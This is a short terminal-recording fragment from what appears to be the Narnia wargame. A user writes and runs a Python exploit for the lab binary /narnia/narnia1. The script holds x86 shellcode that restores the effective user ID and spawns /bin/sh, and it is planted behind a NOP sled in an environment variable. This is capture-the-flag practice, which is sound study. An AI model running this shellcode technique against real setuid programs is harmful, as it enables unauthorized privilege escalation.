[0.467, "o", "import os\r\r\r\n\u001b[?2004l\r\u001b[?2004h> # shellcode: euid=geteuid(); setreuid(euid,euid); execve(\"/bin/sh\")\r\r\r\n\u001b[?2004l\r\u001b[?2004h> sc=bytes([0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0x46,0xcd,0x80,\r\r\r\n\u001b[?2004l\r\u001b[?2004h>           0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,\r\r\r\n\u001b[?2004l\r\u001b[?2004h>           0x53,0x89,0xe1,0x31,0xd2,0xb0,0x0b,0xcd,0x80])\r\r\r\n\u001b[?2004l\r\u001b[?2004h> env={b\"EGG\": b\"\\x90\"*200+sc, b\"PATH\": b\"/usr/bin:/bin\"}\r\r\r\n\u001b[?2004l\r\u001b[?2004h> os.execve(b\"/narnia/narnia1\",[b\"/narnia/narnia1\"],env)\r\r\r\n\u001b[?2004l\r\u001b[?2004h> PY\r\r\r\n\u001b[?2004l\r\u001b]3008;start=34358daa-5f3b-47e3-9727-ffb83728d5e5;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia1\u001b\\\u001b]3008;end=34358daa-5f3b-47e3-9727-ffb83728d5e5;exit=success\u001b\\\u001b]3008;start=23a46779-356e-49d8-9f06-58e4729df442;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia1\u001b\\\u001b[?2004h\u001b]0;narnia1@narnia: ~\u0007narnia1@narnia:~$ python3 /tmp/e.py\r\r\r\n\u001b[?2004l\r"]
